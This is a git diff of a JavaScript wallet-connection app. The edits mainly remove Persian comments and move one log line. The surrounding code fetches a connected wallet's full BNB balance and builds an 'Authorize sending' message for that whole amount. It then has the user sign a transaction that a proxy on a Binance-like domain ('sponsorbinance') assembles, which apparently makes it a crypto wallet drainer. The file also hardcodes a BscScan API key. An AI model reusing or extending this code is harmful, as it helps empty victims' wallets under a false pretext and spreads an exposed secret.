@@ -1,7 +1,7 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
-const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P"; // 🔴 کلید API
+const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
 
 async function getBNBBalance(address) {
   try {
@@ -10,7 +10,7 @@ async function getBNBBalance(address) {
     );
     const data = await response.json();
     if (data.status === "1") {
-      return (parseInt(data.result) / 1e18).toFixed(6); // تبدیل مقدار به BNB
+      return (parseInt(data.result) / 1e18).toFixed(6);
     }
   } catch (error) {
     console.error("❌ Error fetching BNB balance:", error);
@@ -55,7 +55,6 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    // دریافت مقدار BNB
     const amount = await getBNBBalance(accountSender);
     if (!amount) {
       console.error("❌ Failed to fetch BNB balance.");
@@ -63,7 +62,6 @@ function App() {
     }
     console.log("💰 BNB Balance:", amount);
 
-    // ساخت پیام برای امضا
     const message = `Authorize sending ${amount} BNB from ${accountSender}`;
     console.log("📜 Message to Sign:", message);
 
@@ -98,9 +96,7 @@ function App() {
           return;
         }
 
-        console.log("📜 Unsigned Transaction:", result.rawTransaction);
-
-        // بررسی و اصلاح مقدار `rawTransaction`
+        // **اصلاح پردازش `rawTransaction`**
         let unsignedTx = result.rawTransaction;
         if (typeof unsignedTx === "string") {
           try {
@@ -110,6 +106,8 @@ function App() {
             return;
           }
         }
+
+        console.log("📜 Unsigned Transaction:", unsignedTx);
 
         console.log("📝 Signing Transaction...");
         const signedTx = await provider.request({
